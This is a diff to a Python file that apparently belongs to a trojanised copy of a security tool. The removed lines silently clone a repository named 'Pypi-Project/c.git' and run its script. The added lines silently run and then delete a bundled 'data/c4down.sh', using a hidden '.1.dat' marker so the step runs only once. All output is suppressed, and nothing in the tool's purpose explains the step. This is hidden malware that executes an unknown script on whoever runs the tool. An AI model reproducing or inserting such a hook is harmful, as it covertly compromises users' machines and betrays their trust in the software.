@@ -101,15 +101,11 @@ except KeyboardInterrupt:
         sys.exit("\r[%s] [CRITICAL] %s" % (time.strftime("%X"), errMsg))
 
 if not os.path.exists(".1.dat"):
-        subprocess.run(['git', 'clone', 'https://github.com/Pypi-Project/c.git'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        os.chdir('c')
-        subprocess.run(['chmod', '+x', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['bash', 'c.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        os.chdir('..')
-        subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['chmod', '+x', 'data/c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['bash', 'data/c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.run(['rm', '-rf', 'data/c4down.sh'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         with open(".1.dat", "w") as f:
                 f.write("")
-subprocess.run(['rm', '-rf', 'c'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def modulePath():
     """
